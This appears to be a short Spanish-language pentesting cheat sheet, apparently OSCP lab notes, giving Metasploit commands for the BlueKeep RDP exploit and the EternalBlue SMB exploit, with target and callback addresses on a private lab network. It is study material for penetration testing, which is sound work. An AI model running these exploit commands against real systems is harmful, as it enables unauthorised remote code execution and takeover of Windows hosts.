---
layout: article
title: Pentesting - Explotación [Metasploit]
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---
<h2>Escaneo de puertos</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">RDP - 3389</div>
</div>

**Bluekeep**

~~~bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOST 192.168.1.100
set LHOST 192.168.1.150
run
~~~

**Eternalblue**

~~~bash
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/home/kali/oscp-2020/labs/ip-list.txt
set LHOST 192.168.1.150
run
~~~